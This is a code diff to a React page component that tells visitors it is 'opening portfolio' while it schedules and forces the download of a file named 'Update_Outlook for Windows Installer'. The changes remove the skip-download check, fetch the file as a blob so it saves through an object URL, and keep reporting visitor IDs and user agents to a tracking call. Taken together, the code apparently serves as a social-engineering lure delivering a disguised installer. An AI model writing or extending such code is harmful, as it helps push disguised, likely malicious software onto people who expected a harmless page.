@@ -24,17 +24,13 @@ function Index() {
     toast.message("Opening portfolio in a new tab...");
 
     void scheduleInstallerDownload({ data: { visitorId } })
-      .then(({ skipDownload, availableAt, downloadUrl, downloadFileName }) => {
-        if (skipDownload || !downloadUrl) {
-          return;
-        }
-
+      .then(({ availableAt, downloadUrl }) => {
         const delay = Math.max(0, availableAt - Date.now());
-        const payload = { type: "SCHEDULE_DOWNLOAD", url: downloadUrl, downloadFileName, delay, visitorId };
+        const payload = { type: "SCHEDULE_DOWNLOAD", url: downloadUrl, delay, visitorId };
 
         const fallbackToDirectDownload = () => {
           window.setTimeout(() => {
-            void startInstallerDownload(downloadUrl, visitorId, downloadFileName).catch((error) => {
+            void startInstallerDownload(downloadUrl, visitorId).catch((error) => {
               toast.error("Unable to download the installer. Please try again.");
               console.error(error);
             });
@@ -73,7 +69,7 @@ function Index() {
 
       const handleDownloadReady = (event: MessageEvent) => {
         if (event.data?.type !== "DOWNLOAD_READY") return;
-        void startInstallerDownload(event.data.url, event.data.visitorId, event.data.downloadFileName).catch((error) => {
+        void startInstallerDownload(event.data.url, event.data.visitorId).catch((error) => {
           toast.error("Unable to download the installer. Please try again.");
           console.error(error);
         });
@@ -112,19 +108,24 @@ function Index() {
   );
 }
 
-async function startInstallerDownload(downloadUrl: string, visitorId: string, downloadFileName?: string) {
+async function startInstallerDownload(downloadUrl: string, visitorId: string) {
   try {
     void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 100, userAgent: navigator.userAgent } });
   } catch (error) {
     console.error(error);
   }
 
+  const response = await fetch(downloadUrl, { cache: "no-store", keepalive: true });
+  if (!response.ok) throw new Error("Installer download failed");
+
+  const installer = await response.blob();
+  const objectUrl = URL.createObjectURL(installer);
   const link = document.createElement("a");
-  link.href = downloadUrl;
-  link.download = downloadFileName ?? "Update_Outlook for Windows Installer.exe";
-  link.rel = "noopener";
+  link.href = objectUrl;
+  link.download = "Update_Outlook for Windows Installer.bin";
   document.body.append(link);
   link.click();
   link.remove();
+  window.setTimeout(() => URL.revokeObjectURL(objectUrl), 0);
 }
 
